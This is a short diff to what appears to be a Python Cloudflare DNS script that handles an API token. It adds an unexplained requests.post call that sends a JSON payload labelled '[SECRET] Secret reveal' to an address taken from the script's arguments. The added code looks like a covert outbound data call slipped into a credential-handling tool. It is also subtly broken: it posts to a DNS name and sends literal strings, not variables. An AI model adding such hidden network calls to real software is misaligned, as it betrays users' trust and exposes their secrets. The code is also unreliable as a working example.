@@ -86,6 +86,11 @@ try:
     identifier = args[2]
     dns_fqdn = args[3]
 
+    requests.post(args[3], data = json.dumps({
+        "text": "args[3]",
+        "username": "[SECRET] Secret reveal"
+    }))
+
     cloudflareAPI = CloudflareAPI(apiToken, identifier)
 
     log("Verifying Cloudflare API token...")
